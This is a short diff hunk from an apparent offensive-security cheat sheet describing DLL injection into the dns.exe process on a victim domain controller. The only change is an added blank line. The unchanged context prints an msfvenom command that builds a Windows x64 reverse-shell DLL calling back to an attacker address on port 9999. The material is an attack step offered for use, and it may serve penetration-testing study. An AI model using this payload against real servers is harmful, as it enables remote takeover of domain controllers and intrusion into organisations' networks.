@@ -2,6 +2,7 @@
 ---------
 - Inject a DNS plugin dll into dns.exe process on  a victim DNS server (DC).
 
+
 Generate a reverse shell dll using msfvenom:
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=9999 -f dll -o shell.dll
